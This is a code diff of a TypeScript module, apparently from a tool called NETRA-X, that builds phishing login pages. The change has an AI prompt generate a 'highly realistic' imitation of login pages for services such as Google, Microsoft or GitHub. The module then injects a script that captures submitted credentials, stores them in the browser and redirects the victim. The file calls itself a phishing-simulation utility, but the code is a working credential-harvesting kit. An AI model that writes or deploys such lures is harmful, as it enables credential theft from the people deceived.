@@ -1,14 +1,15 @@
 
 'use server';
 /**
- * @fileOverview A server-side utility for cloning a web page for phishing simulations.
+ * @fileOverview An AI flow for simulating the cloning of a web page for phishing simulations.
  *
- * - cloneLoginPage - Fetches a URL's HTML, injects a credential harvester script, and returns the modified content.
+ * - cloneLoginPage - Generates realistic HTML for a login page and injects a credential harvester.
  * - PageClonerInput - The input type for the cloneLoginPage function.
  * - PageClonerOutput - The return type for the cloneLoginPage function.
  */
 
 import {z} from 'zod';
+import { ai } from '@/ai/genkit';
 
 const PageClonerInputSchema = z.object({
   targetUrl: z.string().url('A valid target URL is required.'),
@@ -47,12 +48,17 @@ const getHarvesterScript = (redirectUrl: string) => `
                 };
                 const storageKey = 'netra-captured-credentials';
 
-                const existingData = JSON.parse(localStorage.getItem(storageKey) || '[]');
-                const updatedData = [...existingData, entry];
-                localStorage.setItem(storageKey, JSON.stringify(updatedData));
+                // Use a try-catch block for robust localStorage interaction
+                try {
+                    const existingData = JSON.parse(localStorage.getItem(storageKey) || '[]');
+                    const updatedData = [...existingData, entry];
+                    localStorage.setItem(storageKey, JSON.stringify(updatedData));
+                } catch(e) {
+                    console.error('NETRA-X Harvester: Could not save to localStorage.', e);
+                }
             }
         } catch (e) {
-            console.error('NETRA-X Harvester: Error saving credentials to localStorage.', e);
+            console.error('NETRA-X Harvester: Error capturing form data.', e);
         } finally {
             // Always redirect the user to the intended page.
             // Use a small delay to ensure localStorage has time to save.
@@ -75,37 +81,33 @@ const getHarvesterScript = (redirectUrl: string) => `
 </script>
 `;
 
+const prompt = ai.definePrompt({
+    name: 'loginPageClonerPrompt',
+    input: { schema: z.object({ targetUrl: z.string() }) },
+    output: { schema: z.object({ htmlContent: z.string() }) },
+    prompt: `You are a web page cloner. Your task is to generate a highly realistic, self-contained HTML document that mimics the appearance of a common login page (like Google, Microsoft, GitHub, etc.) based on the target URL provided.
+
+Target URL: {{{targetUrl}}}
+
+Instructions:
+1.  **Generate complete, single HTML file structure.** This includes <!DOCTYPE html>, <html>, <head>, and <body>.
+2.  **Use Tailwind CSS via CDN.** You MUST include this script in the <head>: \`<script src="https://cdn.tailwindcss.com"></script>\`.
+3.  **Create a realistic layout.** The page should have a logo area, a login form with username/password fields, and a submit button. Infer the company from the URL (e.g., 'github.com' -> GitHub).
+4.  **Use placeholders for images and logos.** For a logo, use an SVG icon or a placeholder from placehold.co.
+5.  **Make it believable.** The text, colors, and layout should closely match the expected style of the inferred service.
+6.  The entire output must be a single string in the 'htmlContent' field. Do not include any explanation.
+`,
+});
+
 
 export async function cloneLoginPage(input: PageClonerInput): Promise<PageClonerOutput> {
   const { targetUrl, redirectUrl } = PageClonerInputSchema.parse(input);
 
   try {
-    const response = await fetch(targetUrl, {
-      headers: {
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
-        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-        'Accept-Language': 'en-US,en;q=0.9',
-      },
-    });
-
-    if (!response.ok) {
-      throw new Error(`Failed to fetch the target URL. Status: ${response.status}`);
-    }
-
-    let html = await response.text();
-
-    // 1. Inject <base> tag to fix relative links for CSS, images, etc.
-    const url = new URL(targetUrl);
-    const baseTag = `<base href="${url.origin}">`;
+    const { output } = await prompt({ targetUrl });
+    let html = output!.htmlContent;
     
-    if (html.includes('<head>')) {
-        html = html.replace(/(<head>)/i, `$1${baseTag}`);
-    } else {
-        html = baseTag + html;
-    }
-
-
-    // 2. Inject the credential harvester script before the closing body tag
+    // Inject the credential harvester script before the closing body tag
     const script = getHarvesterScript(redirectUrl);
     if (html.includes('</body>')) {
       html = html.replace(/<\/body>/i, `${script}</body>`);
@@ -113,15 +115,12 @@ export async function cloneLoginPage(input: PageClonerInput): Promise<PageCloner
       html = html + script;
     }
 
-
-    return {
-      htmlContent: html,
-    };
+    return { htmlContent: html };
   } catch (error) {
-    console.error('Error cloning page:', error);
+    console.error('Error cloning page with AI:', error);
     if (error instanceof Error) {
         throw new Error(`Failed to clone page: ${error.message}`);
     }
-    throw new Error('An unknown error occurred during page cloning.');
+    throw new Error('An unknown error occurred during AI page cloning.');
   }
 }
